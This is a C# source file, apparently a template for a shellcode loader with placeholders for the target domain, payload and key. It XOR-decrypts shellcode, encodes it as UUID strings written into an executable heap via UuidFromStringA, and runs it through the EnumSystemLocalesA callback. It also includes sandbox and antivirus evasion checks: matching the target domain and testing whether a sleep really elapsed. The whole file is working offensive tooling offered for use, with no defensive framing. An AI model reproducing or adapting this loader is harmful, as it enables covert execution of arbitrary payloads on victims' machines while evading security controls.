using System;
using System.Text;
using System.Runtime.InteropServices;

namespace RunShellCode
{
    static class Program
    {
        //==============================================================================
        // CRYPTO FUNCTIONS
        //==============================================================================
        private static byte[] xor(byte[] cipher, byte[] key) {
            byte[] decrypted = new byte[cipher.Length];

            for(int i = 0; i < cipher.Length; i++) {
                decrypted[i] = (byte) (cipher[i] ^ key[i % key.Length]);
            }

            return decrypted;
        }

        //==============================================================================
        // MAIN FUNCTION
        //==============================================================================
        static void Main()
        {
            // Sanbox evasion: Check the FQDN
            string fqdn = Environment.GetEnvironmentVariable("USERDNSDOMAIN");
            string targetDomain = "${domain}";
            if (!string.Equals(fqdn, targetDomain, StringComparison.InvariantCultureIgnoreCase))
            {
                Console.WriteLine("FQDN does not match the target domain.");
                return;
            }

            // AV evasion: Sleep for 10s and detect if time really passed
            DateTime t1 = DateTime.Now;
            Sleep(5000);
            double t2 = DateTime.Now.Subtract(t1).TotalSeconds;
            if (t2 < 1.5)
            {
                return;
            }

            byte[] encryptedShellcode = new byte[] { ${shellcode} };
            string key = "${key}";

            //--------------------------------------------------------------
            // Decrypt the shellcode
            byte[] shellcode = null;
            shellcode = xor(encryptedShellcode, Encoding.ASCII.GetBytes(key));

            if ((shellcode.Length % 16) != 0) {
                Console.WriteLine("Shellcode length not a multiply of 16");
                int NullBiteRequired = (16 - (shellcode.Length % 16));
                Console.WriteLine("NullBiteRequired {0}", NullBiteRequired);
                Array.Resize(ref shellcode, shellcode.Length + NullBiteRequired);
            }

            System.Collections.Generic.List<string> list = new System.Collections.Generic.List<string>();

            String[] buff1 = new string[4];
            String[] buff2 = new string[2];
            String[] buff3 = new string[2];
            String[] buff4 = new string[2];
            String[] buff5 = new string[6];

            for (int i = 0; i < (shellcode.Length - 14); i++) {

                for (int t = 0; t < 4; t++) {
                    buff1[t] = shellcode[t + i].ToString("x2");
                }
                System.Array.Reverse(buff1);

                for (int t = 0; t < 2; t++) {
                    buff2[t] = shellcode[t + 4 + i].ToString("x2");
                }
                System.Array.Reverse(buff2);

                for (int t = 0; t < 2; t++) {
                    buff3[t] = shellcode[t + 6 + i].ToString("x2");
                }
                System.Array.Reverse(buff3);

                for (int t = 0; t < 2; t++)
                {
                    buff4[t] = shellcode[t + 8 + i].ToString("x2");
                }

                for (int t = 0; t < 6; t++)
                {
                    buff5[t] = shellcode[t + 10 + i].ToString("x2");
                }

                list.Add(string.Join("-", string.Join("", buff1), string.Join("", buff2), string.Join("", buff3), string.Join("", buff4), string.Join("", buff5)));

                i += 15;
            }

            String[] uuids = list.ToArray();		

            IntPtr HeapCreateH = HeapCreate(0x00040000, 0, 0);

            if (HeapCreateH != null)
            {
                Console.Write("[+] Success HeapCreateH: 0x{0}", HeapCreateH.ToString("x2"));
            }

            IntPtr HeapAllocH = HeapAlloc(HeapCreateH, 0, 0x00100000);
            if (HeapAllocH != null)
            {
                Console.Write("\n[+] Success HeapAllocH : 0x{0}", HeapAllocH.ToString("x2"));
            }

            IntPtr newHeapAddr = HeapCreateH;
            System.Console.Write("\n[+] Uuids:");
            foreach (String uuid in uuids)
            {
                Console.Write("\n{0} ", uuid);
                Console.Write("\n[+] Success HeapAllocH  : 0x{0}", HeapAllocH.ToString("x2"));
                Console.Write("\n[+] Success newHeapAddr : 0x{0}", newHeapAddr.ToString("x2"));
                IntPtr status = UuidFromStringA(uuid, newHeapAddr);
                if (status.ToInt32() == 0)
                {
                    System.Console.Write("\n[+] Success UuidFromStringA : {0}", status);
                }
                newHeapAddr += 16;
            }

            DateTime t3 = DateTime.Now;
            Sleep(5000);
            double t4 = DateTime.Now.Subtract(t3).TotalSeconds;
            if (t4 < 1.5)
            {
                return;
            }
            
            IntPtr EnumSystemLocalesAH = EnumSystemLocalesA(HeapCreateH, 0);

            return;
        }

        // MSDN HeapCreate https://docs.microsoft.com/en-us/windows/win32/api/heapapi/nf-heapapi-heapcreate
        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        static extern IntPtr HeapCreate(uint flOptions, uint dwInitialSize, uint dwMaximumSize);

        // MSDN HeapAlloc https://docs.microsoft.com/en-us/windows/win32/api/heapapi/nf-heapapi-heapalloc
        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        static extern IntPtr HeapAlloc(IntPtr hHeap, uint dwFlags, uint dwBytes);

        // MSDN UuidFromStringA https://docs.microsoft.com/en-us/windows/win32/api/rpcdce/nf-rpcdce-uuidfromstringa
        [DllImport("Rpcrt4.dll", SetLastError = true, ExactSpelling = true)]
        static extern IntPtr UuidFromStringA(String StringUuid, IntPtr UUID);

        // MSDN EnumSystemLocalesA https://docs.microsoft.com/en-us/windows/win32/api/winnls/nf-winnls-enumsystemlocalesa
        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        static extern IntPtr EnumSystemLocalesA(IntPtr lpLocaleEnumProc, uint dwFlags);

        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        static extern void Sleep(uint dwMilliseconds);
    }
}
